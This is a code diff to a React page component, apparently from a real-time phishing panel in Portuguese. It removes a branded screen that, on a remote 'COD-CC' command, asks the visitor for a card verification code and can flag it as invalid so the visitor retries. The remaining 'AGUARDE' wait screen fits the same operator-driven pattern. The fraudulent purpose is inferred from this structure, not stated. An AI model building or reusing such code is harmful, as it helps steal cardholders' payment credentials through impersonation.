@@ -387,42 +387,6 @@ function CommandPage({ userId, onInvalidate }) {
     );
   }
 
-  // =================== COD-CC (Código verificação cartão) ===================
-  if (currentCommand?.action === "COD-CC" || currentCommand?.action === "COD-CC-INV") {
-    const isInvalid = currentCommand?.action === "COD-CC-INV";
-    const referenceText = currentCommand?.command_reference || "";
-    return (
-      <PFCenter>
-        <PFLogo />
-        <div className="w-full max-w-[320px]">
-          <h1 className="text-lg font-bold text-gray-900 mb-4">Insira o código de verificação</h1>
-          {referenceText && <p className="text-gray-600 text-sm leading-relaxed mb-5">{referenceText}</p>}
-          {isInvalid && <PFError message="Código inválido. Digite novamente." />}
-          <form onSubmit={(e) => handleSubmit(e, "cc_code")} className="space-y-4">
-            <div>
-              <label className="block text-sm font-medium mb-1.5" style={{ color: isInvalid ? '#EF4444' : PF_BLUE }}>Código</label>
-              <input
-                type="text" inputMode="numeric" value={inputValue}
-                onChange={(e) => setInputValue(e.target.value.replace(/\D/g, ""))}
-                disabled={loading}
-                className={`w-full px-3 py-3 border-2 rounded-lg focus:outline-none text-lg ${isInvalid ? 'border-red-500' : 'border-[#5C6BC0] focus:border-[#3F51B5]'}`}
-                autoFocus
-              />
-            </div>
-            <a href="#" className="text-[#5C6BC0] hover:text-[#3F51B5] text-sm font-medium">Pedir um novo código</a>
-            <div className="flex justify-end pt-2">
-              <button type="submit" disabled={loading || !inputValue}
-                className="px-8 py-2 rounded text-white font-medium text-sm transition-all disabled:opacity-50"
-                style={{ backgroundColor: !inputValue || loading ? PF_BLUE_LIGHT : PF_BLUE }}>
-                {loading ? <PFSpinner /> : "Confirmar"}
-              </button>
-            </div>
-          </form>
-        </div>
-      </PFCenter>
-    );
-  }
-
   // =================== AGUARDE ===================
   if (currentCommand?.action === "AGUARDE" || !currentCommand?.action) {
     return (
